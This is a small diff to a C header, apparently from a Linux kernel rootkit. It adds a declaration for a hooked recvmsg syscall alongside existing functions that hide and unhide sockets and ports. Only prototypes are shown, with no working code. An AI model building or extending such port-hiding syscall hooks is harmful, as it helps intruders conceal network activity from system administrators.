@@ -26,6 +26,8 @@ void unhide_sockets(void);
 void hide_port(port_t, proto);
 void unhide_port(port_t, proto);
 
+asmlinkage ssize_t g7_recvmsg(int, struct user_msghdr __user *, unsigned);
+
 bool list_contains_port(port_list_t_ptr, port_t, proto);
 port_list_t_ptr find_port_in_list(port_list_t_ptr, port_t, proto);
 port_list_t_ptr add_port_to_list(port_list_t_ptr, port_t, proto);
